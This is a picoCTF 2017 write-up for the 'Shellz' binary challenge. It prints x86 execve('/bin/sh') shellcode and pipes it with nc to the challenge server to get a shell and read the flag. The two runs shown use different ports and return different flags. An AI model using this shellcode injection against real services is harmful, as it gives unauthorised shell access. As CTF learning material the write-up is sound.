# PicoCTF_2017: Shellz

**Category:** Binary
**Points:** 55
**Description:**

>You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:23459.

**Hint:**

>There is a bunch of preexisting shellcode already out there!

## Write-up
The biggest problem with this challenge is the limited amount of shellcodes that would actually work here. It probably took me like 15 tries before I got the [correct shellcode](http://shell-storm.org/shellcode/files/shellcode-575.php). So first, prepare the payload.

    python -c "print('\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')" > payload

Then, use the payload like this

    cat payload - | nc shell2017.picoctf.com 12562
    My mother told me to never accept things from strangers
    How bad could running a couple bytes be though?
    Give me 40 bytes:
    ls
    flag.txt
    shellz
    shellz_no_aslr
    xinetd_wrapper.sh
    cat flag.txt
    a15898b0a97abc19164f240407d6c51b

or 

	(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat -) | nc shell2017.picoctf.com 23459
	My mother told me to never accept things from strangers
	How bad could running a couple bytes be though?
	Give me 40 bytes:
	ls
	flag.txt
	shellz
	shellz_no_aslr
xinetd_wrapper.sh
cat flag.txt
5b5ba2c3b5558ec86315fd52b0c55a87

Therefore, the flag is `a15898b0a97abc19164f240407d6c51b`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTk1NTI0Mzk2NiwtNDQ3MzUyNzRdfQ==
-->